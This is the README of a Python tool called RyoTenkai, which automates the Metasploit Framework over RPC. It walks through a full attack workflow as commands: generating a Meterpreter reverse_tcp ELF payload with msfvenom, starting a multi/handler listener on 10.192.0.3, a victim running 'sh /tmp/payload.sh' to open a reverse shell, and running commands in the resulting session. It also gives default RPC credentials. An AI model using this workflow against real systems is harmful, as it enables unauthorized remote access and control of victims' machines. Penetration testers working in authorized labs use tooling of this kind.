

# RyoTenkai: Metasploit RPC Automation Tool

This Python tool is designed to automate tasks within the Metasploit Framework using the `pymetasploit3` library, allowing for interaction with the Metasploit RPC server. The tool provides functionalities such as running exploits, polling jobs and sessions, interacting with open sessions, and generating payloads using `msfvenom`.

## Features

- **Start Metasploit RPC server**: Start the RPC server with user-specified credentials and port.
- **Run any Metasploit module**: Execute Metasploit modules and retrieve their output.
- **Poll active jobs**: View currently active jobs in the Metasploit instance.
- **Poll active sessions**: View currently active sessions.
- **Access a session and run a command**: Interact with an active session and run commands within it.
- **Generate payloads using msfvenom**: Create payloads in various formats (e.g., ELF, EXE) for use with Metasploit modules.

## Requirements

- Python 3.x
- Metasploit installed and configured
- `pymetasploit3` library for interacting with the Metasploit RPC server
- `configparser` for managing configuration settings
- `argparse` for parsing command-line arguments

## Installation

1. Clone the repository:

    ```bash
    git clone https://github.com/your-repo/ryotenkai.git
    ```

2. Install the required dependencies:

    ```bash
    pip install pymetasploit3
    ```

3. Ensure that your Metasploit instance is running, and the Metasploit RPC server is enabled.

4. Configure the `config.ini` file (see below).

## Configuration

The tool reads the default configurations from a `config.ini` file. Here is an example `config.ini` file:

### Example `config.ini`:

```ini
[default]
msf_password = msfrpc
rpc_server = 10.192.0.3
rpc_port = 55559
rpc_ssl = True

[start_rpc]
rpc_user = msf
rpc_password = msfrpc
rpc_port = 55559

[run_module]
module = multi/handler
PAYLOAD = linux/x64/meterpreter/reverse_tcp
LHOST = 10.192.0.3
LPORT = 12344
ExitOnSession = false

[generate_payload]
format = elf
payload = linux/x64/meterpreter/reverse_tcp
lhost = 10.192.0.3
lport = 12344
output_file = test.sh

[get_jobs]
# No additional settings required as default values are reused

[get_sessions]
# No additional settings required as default values are reused

[run_command]
session_id = 4
session_command = ifconfig
```

## Usage

### General Structure

```bash
python ryotenkai.py <command> [options]
```

### Common Arguments

All commands share the following common arguments:

- `--msf-password`: The password for the Metasploit RPC server (default: `msfrpc`).
- `--rpc-server`: The Metasploit RPC server address (default: `127.0.0.1`).
- `--rpc-port`: The Metasploit RPC server port (default: `55552`).
- `--rpc-ssl`: Use SSL for RPC connection (default: `False`).

These arguments can be overridden via command line or specified in `config.ini`.

### Example Use Case: Full Workflow

This example demonstrates the complete workflow of starting the Metasploit RPC server, generating a payload, setting up a listener, polling jobs, confirming a session is open, and interacting with the session.

#### 1. Start the Metasploit RPC Server

```bash
python ryotenkai.py start_rpc --rpc-password msfrpc --rpc-port 55559
```

This command will start the Metasploit RPC server on port `55559` with the password `msfrpc`.

#### 2. Generate a Payload

```bash
python ryotenkai.py generate_payload elf linux/x64/meterpreter/reverse_tcp 10.192.0.3 12344 /tmp/payload.sh --msf-password msfrpc --rpc-port 55559 --rpc-server 10.192.0.3 --rpc-ssl
```

This command generates a Linux Meterpreter reverse TCP payload in ELF format with the following parameters:
- LHOST: `10.192.0.3`
- LPORT: `12344`
- Output file: `/tmp/payload.sh`

The victim machine will run this payload to initiate a reverse connection.

#### 3. Run the Listener (Metasploit Handler)

```bash
python ryotenkai.py run_module multi/handler --option 'PAYLOAD=linux/x64/meterpreter/reverse_tcp' --option 'LHOST=10.192.0.3' --option 'LPORT=12344' --msf-password msfrpc --rpc-port 55559 --rpc-server 10.192.0.3 --rpc-ssl
```

This command sets up a listener using the `multi/handler` module, waiting for the reverse shell connection from the victim.

#### 4. Poll Jobs to Confirm Listener is Active

```bash
python ryotenkai.py get_jobs --msf-password msfrpc --rpc-server 10.192.0.3 --rpc-port 55559 --rpc-ssl
```

This command checks the active jobs in Metasploit, confirming that the listener (handler) is running.

#### 5. Victim Executes the Payload

On the victim machine, the payload script generated in step 2 is executed:

```bash
sh /tmp/payload.sh
```

This triggers the reverse shell connection to the Metasploit listener.

#### 6. Poll Sessions to Confirm a Session is Open

```bash
python ryotenkai.py get_sessions --msf-password msfrpc --rpc-server 10.192.0.3 --rpc-port 55559 --rpc-ssl
```

This command polls the active sessions in Metasploit, confirming that a Meterpreter session has been opened with the victim.

#### 7. Run a Command in the Session

```bash
python ryotenkai.py run_command 1 ifconfig --msf-password msfrpc --rpc-server 10.192.0.3 --rpc-port 55559 --rpc-ssl
```

This command accesses session ID `1` and runs the `ifconfig` command, retrieving the network interface details of the victim.

## Logging

The script uses Python's logging module to provide detailed information about the operations being performed. The log level is set to `INFO` by default but can be adjusted within the script for more verbose output.

## License

This project is licensed under the MIT License. See the LICENSE file for more information.

